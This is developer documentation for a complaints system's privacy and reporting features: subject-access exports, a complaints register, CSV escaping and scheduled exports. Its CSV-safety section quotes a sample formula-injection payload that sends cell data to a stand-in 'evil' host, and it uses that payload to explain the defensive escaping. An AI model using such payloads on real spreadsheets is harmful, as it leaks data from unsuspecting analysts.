# Reports and privacy exports

[Back to Compliance index](README.md)

---

## 1. Subject-access export (Privacy Act APP 12)

`POST /v1/privacy/subject-access` `{ reference }` with `Cache-Control: no-store` → [subjectAccess, compliance.service.ts#L117-L132](../../apps/api/src/compliance/compliance.service.ts#L117-L132).

| Control | Detail |
|---|---|
| Permission | `ticket:reveal` (supervisors) + **step-up** "export a customer's data" |
| Scope | Only tickets in the supervisor's entity, country and queues that carry this exact opaque reference |
| Withheld for human review | Tickets with communications blocked (investigations) or already redacted → counted as `withheldForReview` |
| Released per ticket | category, subject, description, status, channel, received/resolved dates, complaint outcome, **customer-visible notes**, communications (channel, template, status, date) |
| Not released | Internal notes (only `internalNoteCount`), because releasing them needs a human decision under the Act's exceptions |
| Audit | `privacy.subject_access_exported` with released/withheld counts and `targetId: 'redacted'` (the reference itself isn't copied into the immutable trail) |

**Plain:** the system prepares what it safely can, and flags what a privacy officer must review, instead of auto-releasing everything or nothing.

The response includes the note: "Internal notes and blocked or de-identified cases are not released automatically; a privacy officer must review them."

Test: [workflow.integration-spec.ts#L183](../../apps/api/test/workflow.integration-spec.ts#L183) ("releases subject-access data with internal notes and blocked cases withheld").

---

## 2. Complaints register

`GET /v1/reports/complaints?from=YYYY-MM-DD&to=YYYY-MM-DD&format=json|csv`, `no-store` → [register, L135-L147](../../apps/api/src/compliance/compliance.service.ts#L135-L147).

- `dashboard:read` (supervisors, auditors); **CSV requires step-up** (a file leaving the system is more sensitive than a screen).
- Dates validated as `YYYY-MM-DD`; `to` inclusive (`< to + 1 day`).
- Scope: entity, country, queues; `is_complaint = true`; max 10,000 rows.
- Columns: id, category, channel, priority, status, profile, regulatory status, received, acknowledge due, acknowledged, final response due, final response at, **days to resolve**, IDR outcome, root cause, vulnerability, systemic, AFCA status/reference. **No free text or customer data.**
- Audited `report.complaints_register` with the period, format and row count.

The dashboard's "Complaints register (CSV)" button downloads the last 90 days ([dashboard-page.tsx#L30-L36](../../apps/web/src/features/dashboard/dashboard-page.tsx#L30-L36), [api.ts#L252-L256](../../apps/web/src/api.ts#L252-L256)).

---

## 3. CSV safety

[csv.ts#L5-L10](../../apps/api/src/compliance/csv.ts#L5-L10):

```ts
const cell = (value) => {
  let text = value == null ? '' : value instanceof Date ? value.toISOString() : String(value);
  if (/^[=+\-@\t\r]/.test(text)) text = `'${text}`;                     // neutralise spreadsheet formulas
  return /[",\n\r]/.test(text) ? `"${text.replace(/"/g, '""')}"` : text; // RFC 4180 quoting
};
```

**CSV injection** (formula injection): if a cell contains `=HYPERLINK("http://evil/?"&A1,"click")` and an analyst opens the file in Excel, the formula runs. Prefixing `'` makes Excel treat it as text. Quoting handles commas, quotes and newlines.

---

## 4. Scheduled report export

[report-export.service.ts#L20-L34](../../apps/api/src/operations/report-export.service.ts#L20-L34), run daily by the scheduler when `REPORT_EXPORT_ENABLED=true`:

```text
for each active (legal_entity, country) in case_queues:
  complaints-register.csv  (last 30 days, ≤ 50,000 rows)
  weekly-volumes.csv        (12 weeks: created, resolved, complaints)
  → object storage at reports/<ENTITY>-<COUNTRY>/<YYYY-MM-DD>/<name>.csv
  audit report.exported_scheduled (system:report-export)
```

- **Separated per entity and country**, never mixed, so each regulator or team gets its own folder and bucket permissions can follow.
- Upload errors are logged per file; one failure doesn't stop the others.
- Without object storage, it does nothing.
- Test: [storage.integration-spec.ts#L57](../../apps/api/test/storage.integration-spec.ts#L57).

## 5. Reporting database account

For BI tools that need SQL, the `case_reporting` role reads only `reporting.*` views (no free text). See [audit/database-protection.md](../audit/database-protection.md#2-owner-vs-runtime-vs-reporting-roles).

## 6. Interview answer

> Subject access is supervisor-only with step-up. It searches the caller's scope for one opaque reference, releases customer-visible content, counts internal notes, and withholds blocked or redacted cases for a privacy officer, while the audit records only the counts. The complaints register is scoped, contains no free text, requires step-up for CSV and neutralises spreadsheet formulas. A daily job writes per-entity CSVs to object storage for reporting tools, audited by a system actor.

Next: [Frontend](frontend.md)
